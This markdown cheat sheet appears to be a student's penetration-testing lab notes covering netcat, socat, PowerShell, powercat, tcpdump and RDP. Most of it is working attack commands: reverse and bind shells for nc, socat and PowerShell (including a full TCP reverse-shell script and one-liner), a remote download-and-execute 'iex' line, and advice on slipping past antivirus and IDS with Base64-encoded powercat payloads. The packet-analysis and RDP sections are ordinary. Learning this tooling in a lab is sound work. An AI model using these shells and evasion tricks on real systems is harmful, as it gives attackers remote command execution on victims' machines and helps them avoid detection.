# Netcat

`netcat -n -v 192.168.0.100 110`  
`-n` skips dns resolution while -v uses verbose mode.

`nc -nvlp 4444`  
listen on port 4444.

`nc -nlvp 4444 > incoming.exe` 
Listen and redirect output to receive.

`nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`  
Transfer a file. No progress will be indicated, a best guess is required based on file size.

`nc -nlvp 4444 -e cmd.exe`  
Bind nc to a shell. -e allows redirection for sending of files. Bob is running windows and Alice is running Linux.  
Bob will bind 4444 to cmd.exe and redirect input, output and errors from cmd.exe to the network.  
`nc -nv 10.11.0.22 4444`  
Connect to Bob.

`nc -nlvp 4444`  
Bob sets up a listener to receive a reverse shell. 
`nc -nv 10.11.0.22 4444 -e /bin/bash`  
Input, ouput and errors are redirected to network for Bob to interact with.

# Socat
## Socat vs Netcat

`nc <remote server's ip address> 80`  
`socat - TCP4:<remote server's ip address>:80`  
Connect to server.

`sudo nc -lvp localhost 443`  
`sudo socat TCP4-LISTEN:443 STDOUT`  
Listen (sudo required to bind a listener to ports below 1024).

## Reverse Shell
On Windows (`-d` increases the verbosity)...
`socat -d -d TCP4-LISTEN:443 STDOUT`
On Kali:
`socat TCP4:192.168.0.X:443 EXEC:/bin/bash`
On Windows:
`ls`
Oooooh.

# PowerShell and Powercat

`Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`

## File Transfers

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`

## Reverse Shells

`reverse.ps1`
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.X.X',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

The above likely gets picked up by virus scanner, as does the below one liner:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.X.X',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
```

## Bind Shells

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

On Kali:
`nc -nv 192.168.X.X 443`
`dir`
Should be connected to Windows.

## Powercat

Need a lab box or Defender will just keep ruining your life.

This is a PowerShell version of netcat.
https://github.com/besimorhino/powercat

With the script on the target host, we start by using a PowerShell feature known as Dot-sourcing3 to load the powercat.ps1 script. This will make all variables and functions declared in the script available in the current PowerShell scope. In this way, we can use the powercat function directly in PowerShell instead of executing the script each time:
`. .\powercat.ps1`

This can also be done with remote scripts:
`iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`

### Powercat fille transfers:
Kali:
`sudo nc -lnvp 443 > receiving_powercat.ps1`
Windows:
`powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1`

### Powercat Reverse Shells
Kali:
`sudo nc -lvp 443`
Windows:
`powercat -c 10.11.0.4 -p 443 -e cmd.exe`

### Powercat Bind Shells
Windows:
`powercat -l -p 443 -e cmd.exe`
Kali:
`nc 10.11.0.22 443`

### Powercat Payloads
Powercat can generate payloads.

`powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
./reverseshell.ps1`
This type of generation is often easily detected by IDS. This can sometimes be overcome by executing Base64 encoded commands:
`powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1`

The file will contain an encoded string that can be executed using the PowerShell -E (EncodedCommand) option. However, since the -E option was designed as a way to submit complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be executed in the same way as our unencoded payload. Instead, we to pass the whole encoded string to powershell.exe -E:
`powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgAC`

# TCPDump

`sudo tcpdump -r <filaneme.pcap>`

You can view a file with filtered traffic.
* `-n` to skip DNS lookups.
* `-r` to read from the file.
* Pipe to `awk` and print the destination IP and port (third space separated field.)
* `sort` it.
* `uniq -c` to sort number of time each appears.
* `head` to display only the first ten lines.
`sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head`

More filters such as source host, destination host and port number:
* `sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap`
* `sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap`
* `sudo tcpdump -n port 81 -r password_cracking_filtered.pcap`

We can then print the packet data with `-nX` in both HEX and ASCII to see what we have:
`sudo tcpdump -nX port 81 -r password_cracking_filtered.pcap`

Getting hardcore here. Let's display only data packets. These should have the ACK and PSH flag set. The ACK and PSH are represented by the fourth and fifth bits of the 14th byte. A TCP header picture is useful here...
`CEUAPRSF`
`WCRCSSYI`
`REGKHTNN`
`00011000`  = 24 in decimal

`echo "$((2#00011000))"` = 24 in decimal.

We can pass this number to tcpdump with 'tcp[13] = 24' as a display filter to indicate that we only want to see packets with the ACK and PSH bits set ("data packets") as represented by the fourth and fifth bits (24) of the 14th byte of the TCP header. Bear in mind, the tcpdump array index used for counting the bytes starts at zero, so the syntax should be (tcp[13]).

Used this on the brute force PCAP from CTF:
`sudo tcpdump -A -r brute_force_login.pcapng -n 'tcp[13] = 24' | grep -B 20 -A 4 Authorized`
Password is boris!

DNS Exfiltration from CTF:
`tcpdump -r ~/Desktop/dns.pcapng | awk -F " " '{print substr($9, 1, length($9)-1)}'`
`tcpdump -r ~/Desktop/dns.pcapng | awk -F " " '{print substr($9, 1, length($9)-1)}' | sort | xxd -p -r`

# XfreeRDP 
For connecting to Windows and other RDP sessions with Kali:  
`xfreerdp /u:Tester /p:1234 /v:192.168.0.101`  
Add `/f` for full screen.

